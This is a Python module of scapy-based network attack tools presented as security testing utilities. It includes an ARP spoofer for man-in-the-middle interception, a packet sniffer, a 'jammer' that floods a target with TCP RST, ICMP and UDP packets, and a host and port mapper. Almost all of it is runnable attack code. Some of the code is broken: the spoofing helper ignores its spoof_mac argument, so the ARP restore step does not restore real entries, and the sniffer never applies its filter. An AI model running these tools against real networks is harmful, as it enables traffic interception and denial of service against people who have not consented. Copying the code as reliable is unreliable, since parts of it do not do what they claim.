"""Network security testing tools"""

import socket
import struct
import threading
import time
from scapy.all import *
from .utils import ColorPrinter


class ARPSpoofer:
    """ARP spoofing tool for MITM attacks"""
    
    def __init__(self):
        self.running = False
        
    def spoof(self, target_ip, gateway_ip, interface=None):
        """Perform ARP spoofing between target and gateway
        
        Args:
            target_ip: Victim IP address
            gateway_ip: Gateway/router IP address
            interface: Network interface to use
        """
        try:
            # Get MAC addresses
            target_mac = self._get_mac(target_ip)
            gateway_mac = self._get_mac(gateway_ip)
            
            if not target_mac or not gateway_mac:
                ColorPrinter.error("Could not resolve MAC addresses")
                return
                
            ColorPrinter.info(f"Target MAC: {target_mac}")
            ColorPrinter.info(f"Gateway MAC: {gateway_mac}")
            ColorPrinter.info("Starting ARP spoofing...")
            ColorPrinter.warning("This requires root privileges!")
            
            self.running = True
            
            def poison_target():
                while self.running:
                    # Tell target we're the gateway
                    self._send_arp(target_ip, target_mac, gateway_ip, get_if_hwaddr(interface or conf.iface))
                    # Tell gateway we're the target
                    self._send_arp(gateway_ip, gateway_mac, target_ip, get_if_hwaddr(interface or conf.iface))
                    time.sleep(2)
            
            poison_thread = threading.Thread(target=poison_target)
            poison_thread.daemon = True
            poison_thread.start()
            
            print("ARP spoofing active. Press Ctrl+C to stop.")
            try:
                while self.running:
                    time.sleep(1)
            except KeyboardInterrupt:
                self.running = False
                # Restore ARP tables
                self._restore_arp(target_ip, target_mac, gateway_ip, gateway_mac)
                ColorPrinter.success("ARP tables restored")
                
        except Exception as e:
            ColorPrinter.error(f"ARP spoofing failed: {str(e)}")
            self.running = False
    
    def _get_mac(self, ip):
        """Get MAC address for IP using ARP request"""
        try:
            ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), 
                           timeout=2, verbose=0)
            for s, r in ans:
                return r[Ether].src
        except:
            return None
        return None
    
    def _send_arp(self, target_ip, target_mac, spoof_ip, spoof_mac):
        """Send ARP reply to spoof target"""
        try:
            packet = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, 
                                             hwdst=target_mac, psrc=spoof_ip)
            sendp(packet, verbose=0)
        except:
            pass
    
    def _restore_arp(self, target_ip, target_mac, gateway_ip, gateway_mac):
        """Restore original ARP entries"""
        try:
            # Send correct ARP entries multiple times
            for _ in range(5):
                self._send_arp(target_ip, target_mac, gateway_ip, gateway_mac)
                self._send_arp(gateway_ip, gateway_mac, target_ip, target_mac)
                time.sleep(1)
        except:
            pass


class PacketSniffer:
    """Network packet sniffer"""
    
    def __init__(self):
        self.packets = []
        
    def sniff_packets(self, interface=None, count=50, filter_expr=None):
        """Capture network packets
        
        Args:
            interface: Network interface to sniff
            count: Number of packets to capture
            filter_expr: BPF filter expression
            
        Returns:
            List of captured packets
        """
        try:
            ColorPrinter.info(f"Starting packet capture on {interface or 'default interface'}")
            ColorPrinter.info(f"Packets to capture: {count}")
            
            if filter_expr:
                ColorPrinter.info(f"Filter: {filter_expr}")
            
            packets = sniff(iface=interface, count=count, lfilter=lambda pkt: True, 
                          prn=self._packet_handler)
            
            self.packets.extend(packets)
            
            # Analyze captured packets
            self._analyze_packets(packets)
            
            return packets
            
        except Exception as e:
            ColorPrinter.error(f"Packet capture failed: {str(e)}")
            return []
    
    def _packet_handler(self, packet):
        """Handle incoming packets"""
        timestamp = time.strftime("%H:%M:%S")
        
        if IP in packet:
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst
            
            if TCP in packet:
                src_port = packet[TCP].sport
                dst_port = packet[TCP].dport
                print(f"[{timestamp}] TCP {src_ip}:{src_port} -> {dst_ip}:{dst_port}")
                
            elif UDP in packet:
                src_port = packet[UDP].sport
                dst_port = packet[UDP].dport
                print(f"[{timestamp}] UDP {src_ip}:{src_port} -> {dst_ip}:{dst_port}")
                
            elif ICMP in packet:
                print(f"[{timestamp}] ICMP {src_ip} -> {dst_ip}")
    
    def _analyze_packets(self, packets):
        """Analyze captured packets for interesting information"""
        tcp_count = 0
        udp_count = 0
        icmp_count = 0
        http_count = 0
        dns_count = 0
        
        for packet in packets:
            if TCP in packet:
                tcp_count += 1
                # Check for HTTP traffic
                if packet[TCP].dport == 80 or packet[TCP].sport == 80:
                    http_count += 1
            elif UDP in packet:
                udp_count += 1
                # Check for DNS traffic
                if packet[UDP].dport == 53 or packet[UDP].sport == 53:
                    dns_count += 1
            elif ICMP in packet:
                icmp_count += 1
        
        print(f"\n{ColorPrinter.success('Packet Analysis Summary:')}")
        print(f"  TCP packets: {tcp_count}")
        print(f"  UDP packets: {udp_count}")
        print(f"  ICMP packets: {icmp_count}")
        print(f"  HTTP packets: {http_count}")
        print(f"  DNS packets: {dns_count}")


class NetworkJammer:
    """Network disruption tool"""
    
    def __init__(self):
        self.running = False
        
    def jam_network(self, target_ip, interface=None, intensity=50):
        """Send disruptive packets to target
        
        Args:
            target_ip: Target IP address
            interface: Network interface
            intensity: Packets per second
        """
        ColorPrinter.warning("Network jamming can disrupt legitimate traffic!")
        confirm = input("Continue? (yes/no): ")
        if confirm.lower() != 'yes':
            return
            
        ColorPrinter.info(f"Jamming target: {target_ip}")
        ColorPrinter.info(f"Intensity: {intensity} packets/sec")
        
        self.running = True
        
        def send_jam_packets():
            while self.running:
                try:
                    # Send various types of disruptive packets
                    for _ in range(intensity // 10):
                        # TCP RST packets
                        rst_pkt = IP(dst=target_ip)/TCP(dport=80, flags='R')
                        send(rst_pkt, verbose=0)
                        
                        # ICMP packets
                        icmp_pkt = IP(dst=target_ip)/ICMP()
                        send(icmp_pkt, verbose=0)
                        
                        # Random UDP packets
                        udp_pkt = IP(dst=target_ip)/UDP(dport=53)/Raw(load="JAM"*50)
                        send(udp_pkt, verbose=0)
                        
                    time.sleep(0.1)
                except:
                    pass
        
        jam_thread = threading.Thread(target=send_jam_packets)
        jam_thread.daemon = True
        jam_thread.start()
        
        print("Network jamming active. Press Ctrl+C to stop.")
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False
            ColorPrinter.success("Jamming stopped")


class NetworkMapper:
    """Network topology mapper"""
    
    def __init__(self):
        self.devices = {}
        
    def map_network(self, network, interface=None):
        """Map network devices and topology
        
        Args:
            network: Network in CIDR notation
            interface: Network interface
            
        Returns:
            Dictionary of discovered devices
        """
        ColorPrinter.info(f"Mapping network: {network}")
        
        # Discover active hosts
        from .recon import NetworkRecon
        active_hosts = NetworkRecon.discover_hosts(network)
        
        if not active_hosts:
            ColorPrinter.warning("No active hosts found")
            return {}
        
        print(f"Found {len(active_hosts)} active hosts:")
        for host in active_hosts:
            print(f"  {host}")
        
        # Identify device types and services
        self._identify_devices(active_hosts, interface)
        
        return self.devices
    
    def _identify_devices(self, hosts, interface):
        """Identify device types and services"""
        for host in hosts:
            device_info = {
                'ip': host,
                'mac': None,
                'hostname': None,
                'services': [],
                'device_type': 'unknown'
            }
            
            # Try to get MAC address
            try:
                ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=host), 
                               timeout=1, verbose=0)
                for s, r in ans:
                    device_info['mac'] = r[Ether].src
                    break
            except:
                pass
            
            # Try to get hostname
            try:
                device_info['hostname'] = socket.gethostbyaddr(host)[0]
            except:
                device_info['hostname'] = 'Unknown'
            
            # Port scan common ports to identify services
            from .scanner import PortScanner
            scanner = PortScanner()
            common_ports = '21,22,23,25,53,80,110,143,443,445,3389'
            results = scanner.scan(host, common_ports, threads=20)
            
            if results:
                device_info['services'] = list(results.keys())
                # Infer device type based on services
                if 22 in results:
                    device_info['device_type'] = 'Linux/Unix Server'
                elif 3389 in results:
                    device_info['device_type'] = 'Windows Server'
                elif 80 in results or 443 in results:
                    device_info['device_type'] = 'Web Server'
                elif 21 in results:
                    device_info['device_type'] = 'FTP Server'
            
            self.devices[host] = device_info
        
        # Display results
        print(f"\n{ColorPrinter.success('Network Map:')}")
        for ip, info in self.devices.items():
            print(f"\nDevice: {ip}")
            print(f"  MAC: {info['mac'] or 'Unknown'}")
            print(f"  Hostname: {info['hostname']}")
            print(f"  Type: {info['device_type']}")
            if info['services']:
                print(f"  Services: {', '.join(map(str, info['services']))}")


# Convenience functions
def arp_spoof(target_ip, gateway_ip, interface=None):
    """Convenience function for ARP spoofing"""
    spoofer = ARPSpoofer()
    spoofer.spoof(target_ip, gateway_ip, interface)

def sniff_packets(interface=None, count=50, filter_expr=None):
    """Convenience function for packet sniffing"""
    sniffer = PacketSniffer()
    return sniffer.sniff_packets(interface, count, filter_expr)

def jam_network(target_ip, interface=None, intensity=50):
    """Convenience function for network jamming"""
    jammer = NetworkJammer()
    jammer.jam_network(target_ip, interface, intensity)

def map_network(network, interface=None):
    """Convenience function for network mapping"""
    mapper = NetworkMapper()
    return mapper.map_network(network, interface)